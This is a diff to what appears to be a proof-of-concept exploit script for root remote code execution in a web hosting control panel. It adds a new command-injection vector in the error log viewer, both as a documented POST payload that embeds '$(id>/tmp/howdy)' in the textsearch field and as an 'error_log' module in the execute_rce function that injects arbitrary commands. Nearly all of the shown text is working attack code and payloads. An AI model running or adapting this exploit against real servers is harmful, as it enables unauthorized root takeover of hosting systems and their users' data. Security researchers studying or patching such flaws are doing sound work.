@@ -61,6 +61,12 @@ Multiple Remote Code Execution as root from a low privileged user:
 
 [POST] /index.php?module=letsencrypt&acc=infomodal
 [DATA] domain=test.example.com$(whoami>/tmp/www)&type=info
+
+5. Error log viewer
+
+[POST] index.php?module=error_log&acc=select
+[DATA] domain=test.example.com&tipe=access&numline=20&op=select&textsearch=howdy$(id>/tmp/howdy)
+
 """
 
 
@@ -133,6 +139,17 @@ def execute_rce(base_url, username, command, module):
                 'domain': f'$({command})',
                 'type': 'info'
             }
+        },
+        'error_log': {
+            'url_path': '/index.php?module=error_log&acc=select',
+            'post_data': {
+                'domain': 'test.example.com',
+                'tipe': 'access',
+                'numline': '20',
+                'op': 'select',
+                'textsearch':f'$({command})'
+
+            }
         }
     }
 
@@ -169,7 +186,7 @@ if __name__ == '__main__':
         '--module',
         help="Module to inject the command via",
         default='mysql_manager',
-        choices=['mysql_manager', 'disk_usage', 'dns_zone_editor', 'letsencrypt'],
+        choices=['mysql_manager', 'disk_usage', 'dns_zone_editor', 'letsencrypt', 'error_log'],
         required=False)
 
     parser.add_argument(
